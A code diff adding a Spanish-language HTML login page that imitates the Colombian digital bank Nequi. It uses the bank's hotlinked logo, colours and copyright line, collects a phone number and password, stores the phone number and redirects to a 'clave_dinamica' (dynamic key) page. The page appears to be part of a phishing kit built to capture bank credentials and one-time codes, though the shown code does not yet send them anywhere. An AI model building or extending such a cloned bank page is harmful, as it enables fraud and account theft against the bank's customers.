@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión - Nequi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffe1f0; /* Fondo rosado Nequi */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo img {
+            max-width: 120px;
+            margin: 0 auto;
+            display: block;
+        }
+
+        h1 {
+            color: #670067;
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #670067;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #890089;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.nequi.com.co/content/dam/nequi/images/logos/logo-nequi-1.png" alt="Logo Nequi">
+        </div>
+        <h1>Inicia Sesión</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="phone">Número de Teléfono</label>
+                <input type="tel" id="phone" name="phone" placeholder="3001234567" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" placeholder="Contraseña" required>
+            </div>
+            <button type="button" id="loginButton">Continuar</button>
+        </form>
+        <div class="footer">
+            © 2024 Nequi S.A.S. Todos los derechos reservados.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginButton").addEventListener("click", function () {
+            const phone = document.getElementById("phone").value;
+            const password = document.getElementById("password").value;
+
+            if (!phone || !password) {
+                alert("Por favor, completa todos los campos.");
+                return;
+            }
+
+            // Guardar los datos temporalmente en localStorage
+            localStorage.setItem("phone", phone);
+
+            // Redirigir a la página de clave dinámica
+            window.location.href = "clave_dinamica.html";
+        });
+    </script>
+</body>
+</html>
